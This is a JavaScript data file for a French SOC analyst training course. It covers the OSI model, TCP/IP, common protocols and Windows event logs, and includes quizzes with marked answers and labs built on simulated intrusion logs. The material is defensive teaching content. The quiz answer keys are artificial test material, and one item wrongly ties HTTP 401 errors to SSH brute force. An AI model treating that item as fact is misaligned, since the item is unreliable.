const niveau0 = {
  id: 0,
  name: 'Fondamentaux Informatiques',
  badge: '🎓',
  duration: 50,
  certifications: [],
  description: 'Bases indispensables : réseaux, systèmes, cryptographie et programmation. Niveau BAC.',
  modules: [
    {
      id: 'n0-m1',
      title: 'Réseaux — Fondamentaux',
      lessons: [
        {
          id: 'n0-m1-l1',
          title: 'Le Modèle OSI',
          description: 'Comprendre les 7 couches du modèle OSI et leur rôle dans la communication réseau.',
          duration: 45,
          xpReward: 100,
          hasQuiz: true,
          hasLab: false,
          objectives: [
            'Citer et décrire les 7 couches du modèle OSI',
            'Comprendre le rôle de chaque couche dans la communication',
            'Associer des protocoles à leur couche OSI',
            'Comprendre le principe d\'encapsulation',
          ],
          theory: `# Le Modèle OSI

## Introduction

Le modèle OSI (Open Systems Interconnection) est un cadre conceptuel développé par l'ISO en 1984. Il standardise les communications entre systèmes informatiques en les décomposant en **7 couches distinctes**, chacune ayant des responsabilités précises.

> **Pourquoi c'est essentiel pour un analyste SOC ?**
> Comprendre l'OSI vous permet d'identifier à quelle couche se situe une attaque, d'analyser correctement les traces réseau et de comprendre le comportement des malwares.

---

## Les 7 Couches du Modèle OSI

### Couche 7 — Application
La couche la plus proche de l'utilisateur. Elle gère les **services réseau** directement utilisés par les applications.

- **Protocoles** : HTTP, HTTPS, FTP, SMTP, DNS, SNMP, SSH, Telnet
- **Rôle** : Interface entre les applications et le réseau
- **En SOC** : La plupart des attaques web (injections SQL, XSS, phishing) se passent ici

### Couche 6 — Présentation
Gère le **format et le chiffrement** des données.

- **Fonctions** : Encodage (ASCII, UTF-8), compression, chiffrement SSL/TLS
- **Protocoles** : SSL/TLS (en pratique souvent classé ici)
- **En SOC** : Inspection du trafic chiffré (TLS inspection), détection de tunneling

### Couche 5 — Session
Gère l'**établissement, le maintien et la fermeture des sessions** de communication.

- **Fonctions** : Synchronisation, points de reprise, gestion de dialogue
- **Protocoles** : NetBIOS, RPC, PPTP (négociation)
- **En SOC** : Sessions suspectes, connexions anormalement longues

### Couche 4 — Transport
Assure le **transport fiable** des données de bout en bout.

- **Protocoles principaux** :
  - **TCP** (Transmission Control Protocol) — fiable, orienté connexion (3-way handshake)
  - **UDP** (User Datagram Protocol) — rapide, sans connexion
- **Fonctions** : Ports, segmentation, contrôle de flux, correction d'erreurs
- **En SOC** : Scans de ports, SYN flood, analyse des flags TCP

| Protocole | Fiabilité | Vitesse | Utilisation |
|-----------|-----------|---------|-------------|
| TCP | Oui (ACK) | Plus lent | HTTP, SSH, FTP, SMTP |
| UDP | Non | Rapide | DNS, VoIP, streaming, DHCP |

### Couche 3 — Réseau
Gère l'**adressage logique et le routage** des paquets.

- **Protocoles** : IPv4, IPv6, ICMP, OSPF, BGP, ARP
- **Fonctions** : Adressage IP, routage, fragmentation
- **En SOC** : Analyse d'adresses IP, détection de spoofing, attaques ICMP

\`\`\`
Structure d'un paquet IPv4 :
[En-tête IP | TTL | Protocole | IP Source | IP Destination | Données]
\`\`\`

### Couche 2 — Liaison de données
Gère la **communication entre équipements adjacents** sur le même réseau.

- **Protocoles** : Ethernet, Wi-Fi (802.11), ARP, PPP
- **Identifiant** : Adresse MAC (48 bits, ex: AA:BB:CC:11:22:33)
- **Équipements** : Switches, bridges
- **En SOC** : ARP poisoning, MAC flooding, attaques sur les switches

### Couche 1 — Physique
La couche la plus basse : **transmission des bits** sous forme de signaux électriques, lumineux ou radio.

- **Médias** : Câble cuivre (RJ45), fibre optique, Wi-Fi
- **Équipements** : Hubs, répéteurs, câbles
- **En SOC** : Interception physique, écoute sur câble (peu courante mais réelle)

---

## L'Encapsulation

Quand vous envoyez un email, les données traversent les couches de haut en bas, chaque couche ajoutant un **en-tête** (header) :

\`\`\`
[Données]                          ← Application
[En-tête présentation | Données]   ← Présentation
[En-tête session | ...]            ← Session
[En-tête TCP/UDP | ...]            ← Transport (segment)
[En-tête IP | ...]                 ← Réseau (paquet)
[En-tête Ethernet | ... | FCS]     ← Liaison (trame)
[101001011...]                     ← Physique (bits)
\`\`\`

À destination, le processus inverse (désencapsulation) retire chaque en-tête.

---

## Moyen Mnémotechnique

**"Please Do Not Throw Sausage Pizza Away"** (de la couche 1 à 7) :
- **P**hysical — **D**ata Link — **N**etwork — **T**ransport — **S**ession — **P**resentation — **A**pplication

---

## Application SOC : Localiser une attaque dans le modèle OSI

| Type d'attaque | Couche OSI |
|----------------|-----------|
| Injection SQL, XSS | Couche 7 (Application) |
| Sniffing HTTPS | Couche 6 (Présentation) |
| Hijacking de session | Couche 5 (Session) |
| SYN Flood, scan de ports | Couche 4 (Transport) |
| IP Spoofing, Ping of Death | Couche 3 (Réseau) |
| ARP Poisoning | Couche 2 (Liaison) |
| Écoute physique | Couche 1 (Physique) |

---

## Résumé

Le modèle OSI est votre **carte mentale** pour analyser tout incident réseau. Avant chaque analyse, demandez-vous : "À quelle couche se passe l'événement ?" Cela oriente immédiatement votre investigation.`,
          quiz: [
            {
              id: 'n0-m1-l1-q1',
              xpReward: 50,
              question: 'Combien de couches comporte le modèle OSI ?',
              options: ['4', '5', '7', '8'],
              correct: 2,
              explanation: 'Le modèle OSI (Open Systems Interconnection) comporte **7 couches** : Physique, Liaison, Réseau, Transport, Session, Présentation, Application.',
            },
            {
              id: 'n0-m1-l1-q2',
              xpReward: 50,
              question: 'À quelle couche OSI opère le protocole TCP ?',
              options: ['Couche 3 (Réseau)', 'Couche 4 (Transport)', 'Couche 5 (Session)', 'Couche 7 (Application)'],
              correct: 1,
              explanation: 'TCP (Transmission Control Protocol) opère à la **couche 4 (Transport)**. Il assure un transport fiable et ordonné des données, gère les ports et le contrôle de flux.',
            },
            {
              id: 'n0-m1-l1-q3',
              xpReward: 50,
              question: 'Une attaque de type ARP Poisoning se produit à quelle couche OSI ?',
              options: ['Couche 1 — Physique', 'Couche 2 — Liaison de données', 'Couche 3 — Réseau', 'Couche 4 — Transport'],
              correct: 1,
              explanation: 'L\'ARP Poisoning exploite le protocole ARP qui opère à la **couche 2 (Liaison de données)**. L\'attaquant envoie des réponses ARP falsifiées pour associer sa MAC à l\'IP d\'une autre machine.',
            },
            {
              id: 'n0-m1-l1-q4',
              xpReward: 50,
              question: 'Qu\'est-ce que l\'encapsulation dans le modèle OSI ?',
              options: [
                'La compression des données pour économiser de la bande passante',
                'L\'ajout d\'en-têtes successifs à chaque couche lors de l\'envoi',
                'Le chiffrement des données à la couche présentation',
                'La fragmentation des paquets trop grands',
              ],
              correct: 1,
              explanation: '**L\'encapsulation** est le processus par lequel chaque couche OSI ajoute son propre en-tête (header) aux données reçues de la couche supérieure. À la réception, la désencapsulation retire ces en-têtes couche par couche.',
            },
            {
              id: 'n0-m1-l1-q5',
              xpReward: 50,
              question: 'Quel protocole de la couche Application est utilisé pour résoudre les noms de domaine ?',
              options: ['HTTP', 'SMTP', 'DNS', 'FTP'],
              correct: 2,
              explanation: '**DNS** (Domain Name System) est le protocole de la couche Application qui traduit les noms de domaine (ex: google.com) en adresses IP. Il utilise UDP sur le port 53 (TCP pour les réponses longues).',
            },
          ],
        },
        {
          id: 'n0-m1-l2',
          title: 'TCP/IP et Adressage',
          description: 'Maîtriser la pile TCP/IP, l\'adressage IPv4, les sous-réseaux et le modèle pratique.',
          duration: 60,
          xpReward: 120,
          hasQuiz: true,
          hasLab: true,
          objectives: [
            'Comprendre la pile TCP/IP vs modèle OSI',
            'Maîtriser l\'adressage IPv4 (classes, CIDR)',
            'Calculer des sous-réseaux',
            'Comprendre le 3-way handshake TCP',
          ],
          theory: `# TCP/IP et Adressage Réseau

## La Pile TCP/IP

La pile TCP/IP (aussi appelée modèle Internet) est le modèle **réellement utilisé** sur Internet. Contrairement à l'OSI (7 couches théoriques), TCP/IP n'a que **4 couches** :

| Couche TCP/IP | Correspond à OSI | Protocoles |
|---------------|-----------------|------------|
| Application | OSI 5-6-7 | HTTP, HTTPS, SSH, FTP, DNS, SMTP |
| Transport | OSI 4 | TCP, UDP |
| Internet | OSI 3 | IP, ICMP, ARP |
| Accès réseau | OSI 1-2 | Ethernet, Wi-Fi |

---

## Adressage IPv4

Une adresse IPv4 est composée de **32 bits**, exprimés en 4 octets décimaux séparés par des points :

\`\`\`
192.168.1.100
 ^   ^  ^ ^
 |   |  | └─ 4e octet (100)
 |   |  └─── 3e octet (1)
 |   └─────── 2e octet (168)
 └─────────── 1er octet (192)
\`\`\`

### Classes d'adresses (historique, remplacé par CIDR)

| Classe | Plage | Usage |
|--------|-------|-------|
| A | 1.0.0.0 – 126.255.255.255 | Grandes entreprises |
| B | 128.0.0.0 – 191.255.255.255 | Entreprises moyennes |
| C | 192.0.0.0 – 223.255.255.255 | Petits réseaux |

### Adresses privées (RFC 1918) — Importantes en SOC !

\`\`\`
10.0.0.0/8       → 10.0.0.0 – 10.255.255.255
172.16.0.0/12    → 172.16.0.0 – 172.31.255.255
192.168.0.0/16   → 192.168.0.0 – 192.168.255.255
\`\`\`

> **En SOC :** Les adresses privées ne doivent PAS apparaître comme source dans du trafic Internet. Si vous les voyez, c'est du spoofing ou du traffic interne.

### Adresses spéciales

\`\`\`
127.0.0.1        → Loopback (soi-même)
0.0.0.0          → Route par défaut / toutes les interfaces
255.255.255.255  → Broadcast général
x.x.x.255        → Broadcast du sous-réseau
\`\`\`

---

## Notation CIDR et Sous-réseaux

**CIDR** (Classless Inter-Domain Routing) = adresse IP + masque en notation préfixe :

\`\`\`
192.168.1.0/24
             ^
             └─ 24 bits pour le réseau, 8 bits pour les hôtes
\`\`\`

### Calcul rapide

| CIDR | Masque | Hôtes max | Exemple |
|------|--------|-----------|---------|
| /8  | 255.0.0.0 | 16 777 214 | 10.0.0.0/8 |
| /16 | 255.255.0.0 | 65 534 | 172.16.0.0/16 |
| /24 | 255.255.255.0 | 254 | 192.168.1.0/24 |
| /25 | 255.255.255.128 | 126 | – |
| /30 | 255.255.255.252 | 2 | Liens point-à-point |
| /32 | 255.255.255.255 | 1 | Hôte unique |

**Formule** : Nombre d'hôtes = 2^(32 - préfixe) - 2

---

## Le 3-Way Handshake TCP

Le TCP établit une connexion fiable via **3 étapes** (SYN-SYN/ACK-ACK) :

\`\`\`
Client                    Serveur
  |                          |
  |──── SYN (seq=x) ────────>|  Étape 1 : Client demande connexion
  |<─── SYN/ACK (seq=y, ack=x+1) ─|  Étape 2 : Serveur accepte
  |──── ACK (ack=y+1) ──────>|  Étape 3 : Client confirme
  |          [CONNEXION ÉTABLIE]
  |                          |
  |──── Données ────────────>|
  |<─── ACK ─────────────────|
\`\`\`

### Flags TCP importants en SOC

| Flag | Signification | En SOC |
|------|---------------|--------|
| SYN | Demande de connexion | SYN flood = DDoS |
| ACK | Acquittement | |
| FIN | Fin de connexion propre | |
| RST | Reset (fermeture brutale) | Connexion refusée ou IDS |
| PSH | Envoi immédiat | |
| URG | Données urgentes | Rarement utilisé |

---

## UDP vs TCP : Quand et pourquoi

\`\`\`
TCP (fiable)           UDP (rapide)
─────────────          ──────────────
• HTTP/HTTPS           • DNS
• SSH                  • DHCP
• FTP/SFTP             • VoIP (SIP/RTP)
• SMTP/IMAP            • TFTP
• TLS                  • NTP
• Base de données      • Jeux en ligne
\`\`\`

---

## Ports importants à connaître

| Port | Protocole | Service |
|------|-----------|---------|
| 21 | TCP | FTP |
| 22 | TCP | SSH |
| 23 | TCP | Telnet (DANGER — non chiffré) |
| 25 | TCP | SMTP |
| 53 | TCP/UDP | DNS |
| 80 | TCP | HTTP |
| 110 | TCP | POP3 |
| 143 | TCP | IMAP |
| 443 | TCP | HTTPS |
| 445 | TCP | SMB (Windows) |
| 3389 | TCP | RDP (Windows) |
| 8080 | TCP | HTTP alternatif |

> **En SOC :** Un processus qui écoute sur un port inhabituel (ex: shell sur port 4444) est immédiatement suspect.`,
          quiz: [
            {
              id: 'n0-m1-l2-q1',
              xpReward: 50,
              question: 'Quelle est la plage d\'adresses IP privées selon la RFC 1918 pour la classe C ?',
              options: ['10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16', '169.254.0.0/16'],
              correct: 2,
              explanation: '**192.168.0.0/16** correspond à la plage privée de classe C (192.168.0.0 – 192.168.255.255). Ce sont les adresses les plus courantes dans les réseaux domestiques et d\'entreprise.',
            },
            {
              id: 'n0-m1-l2-q2',
              xpReward: 50,
              question: 'Combien d\'hôtes peut contenir un réseau /24 ?',
              options: ['254', '256', '512', '128'],
              correct: 0,
              explanation: 'Un réseau /24 a 8 bits d\'hôtes : 2^8 = 256, **moins 2** (adresse réseau et broadcast) = **254 hôtes**.',
            },
            {
              id: 'n0-m1-l2-q3',
              xpReward: 50,
              question: 'Lors d\'un 3-way handshake TCP, quel est le 2ème message envoyé ?',
              options: ['SYN', 'ACK', 'SYN/ACK', 'FIN'],
              correct: 2,
              explanation: 'Le 3-way handshake est : SYN (client) → **SYN/ACK** (serveur) → ACK (client). Le serveur répond avec SYN/ACK pour confirmer qu\'il a reçu le SYN et qu\'il accepte la connexion.',
            },
            {
              id: 'n0-m1-l2-q4',
              xpReward: 50,
              question: 'Quel protocole utilise le port 22 ?',
              options: ['FTP', 'Telnet', 'SSH', 'HTTP'],
              correct: 2,
              explanation: '**SSH** (Secure Shell) utilise le port 22 TCP. Il permet une connexion à distance chiffrée. Contrairement à Telnet (port 23), toutes les communications SSH sont chiffrées.',
            },
            {
              id: 'n0-m1-l2-q5',
              xpReward: 50,
              question: 'Dans quelle situation un analyste SOC doit-il suspecter un SYN flood ?',
              options: [
                'Beaucoup de connexions TCP établies normalement',
                'Des milliers de SYN sans ACK de retour du serveur',
                'Des connexions avec FIN/ACK anormaux',
                'Des erreurs de checksum UDP',
              ],
              correct: 1,
              explanation: 'Un **SYN flood** est une attaque DDoS où l\'attaquant envoie des milliers de paquets SYN sans jamais compléter le handshake (pas d\'ACK). La table de connexions du serveur se remplit, rendant le service indisponible.',
            },
          ],
          lab: {
            id: 'lab-n0-m1-l2',
            title: 'Analyse de trafic réseau — Identification TCP/IP',
            description: 'Analysez ces logs de connexion réseau pour identifier des comportements suspects. Utilisez les commandes disponibles pour examiner les données.',
            xpReward: 150,
            files: {
              'connections.log': `[2026-05-25 08:14:32] TCP SYN 192.168.1.50:54231 → 8.8.8.8:53 ESTABLISHED
[2026-05-25 08:14:33] UDP 192.168.1.50:45678 → 8.8.8.8:53 DNS QUERY google.com
[2026-05-25 08:15:01] TCP SYN 10.0.0.200:12345 → 192.168.1.10:22 SYN_ONLY (no ACK)
[2026-05-25 08:15:02] TCP SYN 10.0.0.200:12346 → 192.168.1.10:22 SYN_ONLY (no ACK)
[2026-05-25 08:15:02] TCP SYN 10.0.0.200:12347 → 192.168.1.10:22 SYN_ONLY (no ACK)
[2026-05-25 08:15:02] TCP SYN 10.0.0.200:12348 → 192.168.1.10:22 SYN_ONLY (no ACK)
[2026-05-25 08:15:02] TCP SYN 10.0.0.200:12349 → 192.168.1.10:22 SYN_ONLY (no ACK)
[2026-05-25 08:15:03] TCP SYN 10.0.0.200:12350 → 192.168.1.10:22 SYN_ONLY (no ACK)
[2026-05-25 08:16:22] TCP SYN 192.168.1.75:33445 → 192.168.1.10:4444 ESTABLISHED
[2026-05-25 08:16:22] TCP DATA 192.168.1.75:33445 → 192.168.1.10:4444 200 bytes
[2026-05-25 08:17:00] TCP 192.168.1.10:23 → 192.168.1.75:45123 Telnet session`,
              'README.txt': `RAPPORT DE LOGS RÉSEAU - SOC Lab
Date : 2026-05-25
Objectif : Identifier les comportements suspects

Consigne : Analysez le fichier connections.log et répondez aux questions.
Utilisez : cat, grep pour filtrer les données.`,
            },
            commands: {
              'help': 'cat connections.log\ngrep <pattern> connections.log\nwc -l connections.log\nls',
            },
            questions: [
              {
                id: 'lab-q1',
                text: 'Quelle adresse IP effectue une attaque SYN Flood sur le port 22 ?',
                answer: '10.0.0.200',
                answerAlt: ['10.0.0.200:12345'],
                placeholder: 'ex: 192.168.1.100',
              },
              {
                id: 'lab-q2',
                text: 'Quel port suspect est utilisé pour une connexion établie à 08:16 ? (saisir le numéro de port uniquement)',
                answer: '4444',
                placeholder: 'Numéro de port',
              },
              {
                id: 'lab-q3',
                text: 'Quel protocole non sécurisé (layer 7) est visible dans les logs ?',
                answer: 'telnet',
                answerAlt: ['Telnet', 'TELNET'],
                placeholder: 'Nom du protocole',
              },
            ],
            hints: [
              'Utilisez "grep SYN_ONLY connections.log" pour filtrer les tentatives SYN sans ACK.',
              'Cherchez les connexions sur des ports inhabituels — les ports < 1024 sont standard, les ports > 1024 peuvent être suspects.',
              'Telnet est un protocole de connexion à distance non chiffré, particulièrement dangereux.',
            ],
          },
        },
        {
          id: 'n0-m1-l3',
          title: 'Protocoles Essentiels (DNS, DHCP, HTTP, SSH)',
          description: 'Maîtriser le fonctionnement des protocoles les plus courants utilisés en entreprise.',
          duration: 50,
          xpReward: 110,
          hasQuiz: true,
          hasLab: false,
          objectives: [
            'Comprendre le fonctionnement du DNS et ses vulnérabilités',
            'Maîtriser HTTP/HTTPS et les méthodes HTTP',
            'Comprendre DHCP et ses risques',
            'Connaître SSH et ses modes d\'authentification',
          ],
          theory: `# Protocoles Essentiels

## DNS — Domain Name System

### Fonctionnement
Le DNS est le "annuaire" d'Internet. Il traduit les noms de domaine en adresses IP.

\`\`\`
Client → Resolver → Root Server → TLD Server → Authoritative Server
 |           |            |              |                |
 |  "www.    |            |              |                |
 |  google   |  "Qui gère |   ".com ?"   |  "google.com?" |
 |  .com ?"  |   .com ?"  |              |                |
\`\`\`

### Types d'enregistrements DNS

| Type | Description | Exemple |
|------|-------------|---------|
| A | IPv4 → IP | google.com → 142.250.74.46 |
| AAAA | IPv6 → IP | google.com → 2a00:1450:... |
| MX | Mail server | gmail.com → aspmx.l.google.com |
| CNAME | Alias | www → monsite.com |
| TXT | Texte libre | SPF, DKIM, vérifications |
| PTR | IP → Nom (reverse DNS) | 8.8.8.8 → dns.google |

### Vulnérabilités DNS en SOC

- **DNS Tunneling** : Exfiltration de données via des requêtes DNS anormalement longues
- **DNS Cache Poisoning** : Injection de fausses réponses DNS
- **Domain Generation Algorithm (DGA)** : Les malwares génèrent des domaines aléatoires pour contacter leur C2
- **Typosquatting** : goggle.com, g00gle.com pour le phishing

---

## HTTP / HTTPS

### Méthodes HTTP

| Méthode | Utilisation | En sécurité |
|---------|-------------|-------------|
| GET | Récupérer une ressource | Données dans l'URL (logs) |
| POST | Envoyer des données | Formulaires, logins |
| PUT | Créer/remplacer | Upload de fichiers |
| DELETE | Supprimer | |
| HEAD | En-têtes seulement | Reconnaissance |
| OPTIONS | Méthodes disponibles | Reconnaissance |

### Codes de réponse HTTP

\`\`\`
2xx → Succès
  200 OK
  201 Created
  204 No Content

3xx → Redirection
  301 Moved Permanently
  302 Found (redirection temporaire)

4xx → Erreur client
  400 Bad Request          ← Requête malformée (injection ?)
  401 Unauthorized         ← Authentification requise
  403 Forbidden            ← Accès refusé
  404 Not Found            ← Ressource inexistante
  429 Too Many Requests    ← Rate limiting (brute force ?)

5xx → Erreur serveur
  500 Internal Server Error ← Bug serveur (SQLi ?)
  502 Bad Gateway
  503 Service Unavailable   ← Peut indiquer DDoS
\`\`\`

### HTTPS et TLS

HTTPS = HTTP + chiffrement TLS. Le port 443 est utilisé.

\`\`\`
TLS Handshake :
Client Hello → Server Hello + Certificat → Vérification certificat
→ Échange de clés → Session chiffrée établie
\`\`\`

---

## DHCP — Dynamic Host Configuration Protocol

Le DHCP assigne automatiquement une configuration réseau aux clients (IP, masque, passerelle, DNS).

### Processus DHCP (DORA)
1. **D**iscover — Le client diffuse "Je cherche un serveur DHCP"
2. **O**ffer — Le serveur propose une IP
3. **R**equest — Le client accepte l'offre
4. **A**cknowledge — Le serveur confirme l'attribution

### Risques DHCP
- **DHCP Starvation** : Un attaquant épuise le pool d'adresses
- **Rogue DHCP** : Un faux serveur DHCP distribue de fausses configs (gateway attaquant = MITM)

---

## SSH — Secure Shell

SSH permet un accès à distance **chiffré** (port 22).

### Modes d'authentification
1. **Mot de passe** — Simple mais vulnérable au brute force
2. **Clé publique/privée** — Bien plus sécurisé (recommandé)
3. **Certificat** — Niveau enterprise

### En SOC : Signaux d'alerte SSH
- Multiples tentatives de connexion échouées → brute force
- Connexion SSH depuis un pays inhabituel
- Connexion SSH à 3h du matin
- Connexion SSH vers un serveur qui n'est pas normalement administré à distance`,
          quiz: [
            {
              id: 'n0-m1-l3-q1',
              xpReward: 50,
              question: 'Quel type d\'enregistrement DNS associe un nom de domaine à une adresse IPv4 ?',
              options: ['MX', 'CNAME', 'A', 'PTR'],
              correct: 2,
              explanation: 'L\'enregistrement **A** (Address) associe un nom de domaine à une adresse IPv4. Ex: example.com → 93.184.216.34. L\'enregistrement AAAA fait la même chose pour IPv6.',
            },
            {
              id: 'n0-m1-l3-q2',
              xpReward: 50,
              question: 'Un analyste voit des centaines de tentatives de connexion SSH avec des erreurs 401. Que suspecte-t-il ?',
              options: ['Une attaque DDoS', 'Une attaque par brute force', 'Un DNS tunneling', 'Un DHCP rogue'],
              correct: 1,
              explanation: 'Des centaines d\'erreurs **401 (Unauthorized)** sur SSH indiquent une **attaque par brute force** — l\'attaquant essaie de nombreux couples identifiant/mot de passe. Il faut bloquer l\'IP et vérifier les comptes ciblés.',
            },
            {
              id: 'n0-m1-l3-q3',
              xpReward: 50,
              question: 'Qu\'est-ce qu\'un "DHCP Rogue" ?',
              options: [
                'Un client qui demande trop d\'adresses IP',
                'Un serveur DHCP non autorisé qui distribue de fausses configurations',
                'Une attaque qui épuise les adresses IP disponibles',
                'Un DHCP qui tourne sur IPv6',
              ],
              correct: 1,
              explanation: 'Un **DHCP Rogue** est un faux serveur DHCP installé par un attaquant. Il distribue des configurations malveillantes (ex: sa propre adresse comme passerelle) pour effectuer une attaque Man-in-the-Middle et intercepter tout le trafic.',
            },
            {
              id: 'n0-m1-l3-q4',
              xpReward: 50,
              question: 'Quel code HTTP suggère qu\'un serveur est potentiellement sous attaque DDoS ?',
              options: ['404 Not Found', '401 Unauthorized', '200 OK', '503 Service Unavailable'],
              correct: 3,
              explanation: '**503 Service Unavailable** indique que le serveur ne peut pas traiter la requête, souvent à cause d\'une surcharge. En SOC, de nombreux 503 peuvent indiquer une attaque DDoS ou une saturation du serveur.',
            },
          ],
        },
      ],
    },
    {
      id: 'n0-m2',
      title: 'Systèmes d\'Exploitation',
      lessons: [
        {
          id: 'n0-m2-l1',
          title: 'Windows — Fondamentaux pour le SOC',
          description: 'Architecture Windows, système de fichiers, registre, processus et services.',
          duration: 55,
          xpReward: 120,
          hasQuiz: true,
          hasLab: true,
          objectives: [
            'Comprendre la structure de Windows (noyau, registry, SAM)',
            'Maîtriser les répertoires système importants',
            'Comprendre les processus et services Windows',
            'Connaître les Event Logs Windows',
          ],
          theory: `# Windows — Fondamentaux SOC

## Architecture Windows

Windows est basé sur une architecture **NT (New Technology)** avec :

- **Noyau (Kernel)** : Gestion du matériel, mémoire, processus
- **HAL (Hardware Abstraction Layer)** : Interface matériel
- **Win32 API** : Interface pour les applications
- **User mode / Kernel mode** : Séparation des privilèges

---

## Structure du Système de Fichiers

### Répertoires critiques pour le SOC

\`\`\`
C:\\Windows\\System32\\          → Exécutables système critiques (lsass.exe, svchost.exe)
C:\\Windows\\SysWOW64\\          → Exécutables 32 bits sur système 64 bits
C:\\Windows\\Temp\\              → Fichiers temporaires (souvent utilisés par malwares)
C:\\Users\\<user>\\AppData\\      → Données d'applications utilisateur
C:\\Users\\<user>\\AppData\\Local\\Temp\\ → Temp utilisateur (malwares)
C:\\Program Files\\             → Applications 64 bits
C:\\Program Files (x86)\\       → Applications 32 bits
C:\\ProgramData\\               → Données d'applications (non liées à un user)
\`\`\`

> **Red flag SOC** : Un malware qui s'exécute depuis Temp ou AppData est suspect.

---

## Le Registre Windows

Le registre est une base de données hiérarchique qui stocke les configurations système.

### Ruches (Hives) importantes

| Ruche | Contenu |
|-------|---------|
| HKLM\\SOFTWARE | Logiciels installés |
| HKLM\\SYSTEM | Configuration système |
| HKLM\\SAM | Comptes locaux (hachages de mots de passe) |
| HKCU | Configuration de l'utilisateur actuel |
| HKU | Configurations de tous les utilisateurs |

### Clés de persistance (très importants en SOC !)

\`\`\`
HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon
\`\`\`

> **En SOC** : Ces clés sont les endroits favoris des malwares pour assurer leur persistance au démarrage.

---

## Processus Windows Critiques

Ces processus sont légitimes et doivent TOUJOURS être présents :

| Processus | Rôle | Chemin légitime |
|-----------|------|-----------------|
| lsass.exe | Authentification (LSA) | C:\\Windows\\System32 |
| svchost.exe | Hôte de services | C:\\Windows\\System32 |
| csrss.exe | Sous-système Win32 | C:\\Windows\\System32 |
| wininit.exe | Initialisation | C:\\Windows\\System32 |
| explorer.exe | Shell Windows | C:\\Windows |
| winlogon.exe | Connexion utilisateur | C:\\Windows\\System32 |

> **Technique d'attaque** : Le "Process Hollowing" consiste à lancer un processus légitime et remplacer son code par du code malveillant. Vérifiez toujours le chemin d'exécution !

---

## Windows Event Logs

Les journaux d'événements Windows sont **essentiels** en forensics SOC.

### Journaux principaux

\`\`\`
Applications  → Événements applicatifs
System        → Événements système
Security      → Authentification, accès, audit
Setup         → Installation
\`\`\`

### Event IDs critiques (à mémoriser !)

| Event ID | Signification | Priorité SOC |
|----------|---------------|--------------|
| **4624** | Connexion réussie | Important |
| **4625** | Connexion échouée | CRITIQUE |
| **4648** | Connexion avec credentials explicites | Important |
| **4672** | Privilèges spéciaux assignés | Critique |
| **4688** | Nouveau processus créé | Important |
| **4697** | Service installé | Critique |
| **4720** | Compte créé | Important |
| **4732** | Ajout au groupe Administrateurs | CRITIQUE |
| **7045** | Nouveau service installé | Critique |
| **1102** | Journaux effacés | CRITIQUE |

> **En SOC** : L'Event ID 1102 (journaux effacés) est un signe d'anti-forensics. Un attaquant qui efface les logs a probablement quelque chose à cacher.`,
          quiz: [
            {
              id: 'n0-m2-l1-q1',
              xpReward: 50,
              question: 'Quel Event ID Windows signale la suppression des journaux d\'audit (anti-forensics) ?',
              options: ['4624', '4625', '1102', '4732'],
              correct: 2,
              explanation: 'L\'**Event ID 1102** ("The audit log was cleared") indique qu\'un acteur a effacé les journaux de sécurité. C\'est un signal critique d\'anti-forensics — un attaquant cherche à couvrir ses traces.',
            },
            {
              id: 'n0-m2-l1-q2',
              xpReward: 50,
              question: 'Un malware se cache dans quel répertoire Windows pour être exécuté au démarrage ?',
              options: [
                'C:\\Windows\\System32\\',
                'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',
                'C:\\Program Files\\',
                'C:\\Users\\Public\\',
              ],
              correct: 1,
              explanation: 'La clé de registre **HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run** est l\'emplacement le plus courant pour la **persistance malveillante**. Tout programme listé ici s\'exécutera automatiquement au démarrage de Windows.',
            },
            {
              id: 'n0-m2-l1-q3',
              xpReward: 50,
              question: 'Quel Event ID indique l\'ajout d\'un compte au groupe Administrateurs ?',
              options: ['4720', '4624', '4732', '4688'],
              correct: 2,
              explanation: 'L\'**Event ID 4732** ("A member was added to a security-enabled local group") est généré quand un compte est ajouté à un groupe local, notamment le groupe Administrateurs. C\'est un indicateur de privilege escalation.',
            },
            {
              id: 'n0-m2-l1-q4',
              xpReward: 50,
              question: 'Un processus svchost.exe s\'exécute depuis C:\\Windows\\Temp\\. Est-ce normal ?',
              options: [
                'Oui, svchost peut s\'exécuter depuis n\'importe quel répertoire',
                'Non, svchost.exe légitime est toujours dans C:\\Windows\\System32\\',
                'Oui, certains services utilisent Temp',
                'Cela dépend de la version de Windows',
              ],
              correct: 1,
              explanation: '**Non, c\'est suspect !** Le vrai svchost.exe se trouve TOUJOURS dans **C:\\Windows\\System32\\**. Un svchost.exe dans Temp est classiquement un malware qui utilise le "process masquerading" pour se camoufler en processus légitime.',
            },
          ],
          lab: {
            id: 'lab-n0-m2-l1',
            title: 'Analyse de logs Windows — Détection d\'intrusion',
            description: 'Analysez ces Event Logs Windows pour identifier une tentative d\'intrusion et d\'escalade de privilèges.',
            xpReward: 200,
            files: {
              'security.evtx.txt': `[2026-05-25 02:13:45] EventID=4625 Account=Administrator IP=185.220.101.45 Logon_Type=3 FAILURE
[2026-05-25 02:13:46] EventID=4625 Account=Administrator IP=185.220.101.45 Logon_Type=3 FAILURE
[2026-05-25 02:13:47] EventID=4625 Account=Administrator IP=185.220.101.45 Logon_Type=3 FAILURE
[2026-05-25 02:13:48] EventID=4625 Account=Administrator IP=185.220.101.45 Logon_Type=3 FAILURE
[2026-05-25 02:13:49] EventID=4625 Account=Administrator IP=185.220.101.45 Logon_Type=3 FAILURE
[2026-05-25 02:14:01] EventID=4624 Account=Administrator IP=185.220.101.45 Logon_Type=3 SUCCESS
[2026-05-25 02:14:02] EventID=4672 Account=Administrator Privileges=SeDebugPrivilege,SeTakeOwnershipPrivilege
[2026-05-25 02:14:15] EventID=4688 Process=cmd.exe Parent=svchost.exe User=Administrator
[2026-05-25 02:14:20] EventID=4732 Group=Administrators Member=hacker_account
[2026-05-25 02:15:00] EventID=7045 ServiceName=backdoor_svc ServicePath=C:\\Windows\\Temp\\bd.exe
[2026-05-25 02:15:30] EventID=1102 Audit_Log_Cleared User=Administrator`,
              'system.evtx.txt': `[2026-05-25 02:14:30] EventID=7045 ServiceName=WindowsDefenderSvc Status=STOPPED
[2026-05-25 02:15:00] EventID=7045 ServiceName=backdoor_svc Path=C:\\Windows\\Temp\\bd.exe
